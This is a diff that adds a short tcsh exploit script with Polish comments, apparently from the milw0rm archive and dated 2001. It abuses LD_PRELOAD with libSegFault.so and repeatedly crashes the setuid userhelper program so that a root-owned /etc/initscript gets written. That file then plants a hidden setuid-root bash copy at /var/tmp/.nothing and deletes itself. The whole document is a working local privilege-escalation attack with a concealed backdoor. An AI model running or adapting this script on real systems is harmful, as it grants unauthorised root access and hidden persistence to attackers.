@@ -1,0 +1,25 @@
+#!/bin/tcsh
+# przyklad wykorzystania dziury w LD_PRELOAD
+# shadow (tested on redhat 6.0, should work on others)
+
+if ( -e /etc/initscript ) echo uwaga: /etc/initscript istnieje
+cd /lib
+umask 0
+setenv LD_PRELOAD libSegFault.so
+setenv SEGFAULT_OUTPUT_NAME /etc/initscript
+echo czekaj... to moze chwile potrwac...
+while (! -e /etc/initscript )
+  ( userhelper >& /dev/null & ; killall -11 userhelper >& /dev/null ) > /dev/null
+end
+
+echo utworzylem plik initscript
+
+cat > /etc/initscript << _init_
+cp /bin/bash /var/tmp/.nothing
+chmod 6755 /var/tmp/.nothing
+rm /etc/initscript
+_init_
+
+echo i nawet go podmienilem
+
+# milw0rm.com [2001-03-04]
